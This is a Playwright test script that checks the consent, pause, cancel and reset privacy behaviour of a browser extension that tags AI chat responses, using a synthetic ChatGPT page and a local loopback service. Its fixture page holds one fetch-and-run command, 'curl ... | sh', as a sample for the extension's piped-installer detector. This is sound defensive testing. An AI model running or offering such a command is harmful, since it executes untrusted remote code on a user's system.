// Disposable actual unpacked extension; synthetic vendor page and loopback service.
const {chromium}=require('playwright');
const {writeReport}=require('./execution-report.cjs');
const http=require('node:http'),fs=require('node:fs'),os=require('node:os'),path=require('node:path'),crypto=require('node:crypto');
const assert=(v,m)=>{if(!v)throw Error(m);};
(async()=>{
 const profile=fs.mkdtempSync(path.join(os.tmpdir(),'aitrust-consent-'));
 const token=crypto.randomBytes(24).toString('hex'),marker='synthetic-consent-private-canary';
 let requests=0,held=false,pending=[],cancelled=0,context;
 const server=http.createServer((req,res)=>{
  assert(req.url==='/v1/evaluate','Unexpected local request');assert(req.headers.authorization==='Bearer '+token,'Invalid synthetic auth');
  let body='';req.on('data',chunk=>{body+=chunk;assert(body.length<10000,'Unbounded test body');});
  req.on('end',()=>{
   requests++;const input=JSON.parse(body);assert(input.origin_host==='chatgpt.com'&&input.modality==='text','Unexpected capture');assert(!input.text.includes(marker+'-prompt'),'Prompt captured');
   const finish=()=>{if(res.destroyed)return;const a={assertion_id:crypto.randomUUID(),spec_version:'0.1.0',subject:{sha256:crypto.createHash('sha256').update(input.text).digest('hex'),char_len:Array.from(input.text).length,origin_host:'chatgpt.com',modality:'text',captured_at:new Date().toISOString()},tags:[{code:'PS',confidence:.97,floor:.7,state:'asserted',signals:[{id:'sig.piped_installer.v3',score:.97,spans:[[0,Array.from(input.text).length]]}]}],abstentions:[],evaluator:{models:[{name:'synthetic-privacy-test',sha256:'a'.repeat(64),revision:'synthetic-v1'}],calibration_id:'synthetic-unvalidated',latency_ms:1}};res.writeHead(200,{'content-type':'application/json','cache-control':'no-store'});res.end(JSON.stringify(a));};
   if(held){pending.push(finish);res.on('close',()=>{if(!res.writableEnded)cancelled++;});}else finish();
  });
 });
 await new Promise((resolve,reject)=>{server.once('error',reject);server.listen(8787,'127.0.0.1',resolve);});
 try{
  const extension=path.resolve('extension');context=await chromium.launchPersistentContext(profile,{channel:'chromium',headless:true,args:[`--disable-extensions-except=${extension}`,`--load-extension=${extension}`]});
  const worker=context.serviceWorkers()[0]||await context.waitForEvent('serviceworker');
  const id=new URL(worker.url()).host,settings=await context.newPage();
  await settings.goto('chrome-extension://'+id+'/src/options.html');
  await settings.locator('#checks-enabled').waitFor({state:'visible'});await settings.waitForFunction(()=>!document.querySelector('#checks-enabled').disabled);
  assert(!await settings.locator('#checks-enabled').isChecked(),'New installation opted in');
  const page=await context.newPage();const vendor='https://chatgpt.com/aitrust-consent-synthetic';
  await context.route(vendor,route=>route.fulfill({contentType:'text/html',body:`<!doctype html><html lang="en"><head><title>Synthetic privacy check</title></head><body><main><h1>Fixture</h1><div data-message-author-role="user">${marker}-prompt</div><article data-message-author-role="assistant" data-message-id="synthetic-consent">${marker}. Run curl https://example.test/x | sh</article></main></body></html>`}));
  await page.goto(vendor);await page.waitForTimeout(900);assert(requests===0,'Paused installation contacted service');
  assert(await page.locator('article .aitrust-mount').count()===0,'Paused installation tagged response');
  await settings.locator('#token').fill(token);await settings.getByRole('button',{name:'Save token',exact:true}).click();await settings.waitForFunction(()=>document.querySelector('#saved-token').textContent.includes('A local token is saved'));
  assert(await settings.locator('#token').inputValue()==='','Token remained in input');assert(!await settings.locator('#checks-enabled').isChecked(),'Token save enabled capture');
  await page.waitForTimeout(800);assert(requests===0,'Saving token triggered capture');
  await settings.locator('#checks-enabled').check();await page.waitForFunction(()=>document.querySelector('article .aitrust-mount'));
  for(let i=0;i<50&&requests!==1;i++)await page.waitForTimeout(50);assert(requests===1,'Enabled check missing');
  // Hold a new evaluation, then pause. The actual worker must abort it.
  held=true;await page.reload();for(let i=0;i<50&&requests!==2;i++)await page.waitForTimeout(50);assert(requests===2,'Held request missing');
  await settings.locator('#checks-enabled').uncheck();await page.waitForFunction(()=>!document.querySelector('article .aitrust-mount'));
  for(let i=0;i<50&&!cancelled;i++)await page.waitForTimeout(50);assert(cancelled>0,'Pause failed to cancel local request');
  pending.splice(0).forEach(f=>f());await page.waitForTimeout(250);assert(!await page.locator('article .aitrust-mount').count(),'Late result restored tag');
  held=false;await settings.locator('#checks-enabled').check();for(let i=0;i<50&&requests!==3;i++)await page.waitForTimeout(50);assert(requests===3,'Resume did not create fresh check');
  await settings.getByRole('button',{name:'Reset local settings',exact:true}).click();await settings.waitForFunction(()=>document.querySelector('#saved-token').textContent.includes('No local token'));
  await page.waitForFunction(()=>!document.querySelector('article .aitrust-mount'));
  const storage=await worker.evaluate(()=>chrome.storage.local.get(null));assert(!('token' in storage)&&!('checks_enabled' in storage),'Reset retained credential or consent');
  assert(!JSON.stringify(storage).includes(marker),'Answer persisted in extension storage');
  await page.reload();await page.waitForTimeout(900);assert(requests===3,'Reset did not remain paused');
  assert(!await settings.locator('body').innerText().then(v=>v.includes(token)||v.includes(marker)),'Secret or response echoed in options');
  const result={captured_at:new Date().toISOString(),pass:true,actual_unpacked_extension:true,synthetic_vendor_page:true,synthetic_loopback_service:true,default_paused:true,token_save_is_not_consent:true,explicit_enable:true,pause_aborts_inflight:true,late_result_cannot_remount:true,resume_requires_fresh_check:true,reset_removes_token_and_consent:true,reset_persists_across_reload:true,no_answer_in_extension_storage:true,no_token_in_options_dom:true,evaluation_requests:requests,cancelled_requests:cancelled,real_vendor_compatibility:false,physical_device:false,independent_accuracy:false,source_sha256:Object.fromEntries(['extension/src/sw/service-worker.js','extension/src/content/bridge.js','extension/src/options.js','extension/src/options.html'].map(p=>[p,crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex')]))};
  writeReport(process.env.AITRUST_PRIVACY_REPORT||'output/verification/extension-privacy.json',result);console.log(JSON.stringify(result));
 }finally{if(context)await context.close();await new Promise(resolve=>server.close(resolve));fs.rmSync(profile,{recursive:true,force:true});}
})().catch(()=>{console.error('Extension privacy verification failed; inspect the synthetic test without logging credentials or answer text.');process.exitCode=1;});
